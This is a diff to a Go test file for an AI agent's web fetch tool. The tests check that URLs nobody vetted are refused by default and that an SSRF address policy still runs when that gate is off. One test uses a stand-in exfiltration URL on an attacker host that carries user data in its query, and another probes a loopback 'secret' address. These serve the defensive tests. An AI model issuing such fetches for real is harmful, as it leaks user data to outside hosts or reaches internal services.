@@ -312,6 +312,9 @@ func TestToolIsAgentOnlyAndNotOnTheFastPath(t *testing.T) {
 	}
 }
 
+// TestFetchToolFailsCleanlyBeforeTheNetwork exercises the address policy. The
+// provenance gate is turned off here so each URL reaches the SSRF check; the
+// shipped default gate has its own test below.
 func TestFetchToolFailsCleanlyBeforeTheNetwork(t *testing.T) {
 	tests := []struct {
 		name   string
@@ -329,7 +332,9 @@ func TestFetchToolFailsCleanlyBeforeTheNetwork(t *testing.T) {
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			reg := register(t, web.NewModule())
+			reg := register(t, configure(t, map[string]any{
+				"fetch": map[string]any{"require_provenance": false},
+			}))
 			_, err := reg.Execute(context.Background(), web.FetchName, json.RawMessage(tt.args))
 			if err == nil {
 				t.Fatal("Execute succeeded, want a clean failure")
@@ -342,6 +347,51 @@ func TestFetchToolFailsCleanlyBeforeTheNetwork(t *testing.T) {
 				t.Fatalf("failure message leaked %q: %q", tt.forbid, got)
 			}
 		})
+	}
+}
+
+// TestFetchRefusesAnUnvettedURLByDefault is #172's policy at the module edge:
+// a public URL that no search returned and the user never said is refused with
+// one fixed line, before any reader runs. A partial fetch block must keep the
+// default on.
+func TestFetchRefusesAnUnvettedURLByDefault(t *testing.T) {
+	sections := map[string]map[string]any{
+		"omitted fetch block": {},
+		"partial fetch block": {"fetch": map[string]any{"max_chars": 321}},
+		"explicit true":       {"fetch": map[string]any{"require_provenance": true}},
+	}
+	for name, values := range sections {
+		t.Run(name, func(t *testing.T) {
+			reg := register(t, configure(t, values))
+			_, err := reg.Execute(context.Background(), web.FetchName,
+				json.RawMessage(`{"url":"https://attacker.example.test/?d=shopping-list"}`))
+			if err == nil {
+				t.Fatal("Execute succeeded, want the provenance refusal")
+			}
+			got := tool.FailureMessage(err)
+			if got != "I can only open links from your request or a search result." {
+				t.Fatalf("failure message = %q", got)
+			}
+			if strings.Contains(got, "attacker.example.test") {
+				t.Fatalf("failure message leaked the URL: %q", got)
+			}
+		})
+	}
+}
+
+// TestFetchProvenanceCanBeDisabled keeps the owner escape hatch honest: the
+// config switch restores the old open reader, whose address policy still runs.
+func TestFetchProvenanceCanBeDisabled(t *testing.T) {
+	reg := register(t, configure(t, map[string]any{
+		"fetch": map[string]any{"require_provenance": false},
+	}))
+	_, err := reg.Execute(context.Background(), web.FetchName,
+		json.RawMessage(`{"url":"http://127.0.0.1/secret"}`))
+	if err == nil {
+		t.Fatal("Execute succeeded, want the address-policy refusal")
+	}
+	if got := tool.FailureMessage(err); got != "I can't open that address." {
+		t.Fatalf("failure message = %q, want the SSRF line", got)
 	}
 }
 
@@ -504,7 +554,10 @@ func TestLiveFetchPublicPage(t *testing.T) {
 		t.Skip("set WEB_FETCH_LIVE_URL to a public article to run the live smoke")
 	}
 	reg := register(t, web.NewModule())
-	result, err := reg.Execute(context.Background(), web.FetchName,
+	// The live smoke names the URL itself, which is the shipped provenance
+	// rule for a page no search returned.
+	ctx := tool.WithRequest(context.Background(), tool.Request{ID: "live-fetch", UserText: rawURL})
+	result, err := reg.Execute(ctx, web.FetchName,
 		json.RawMessage(fmt.Sprintf(`{"url":%q}`, rawURL)))
 	if err != nil {
 		t.Fatalf("live fetch: %v", err)
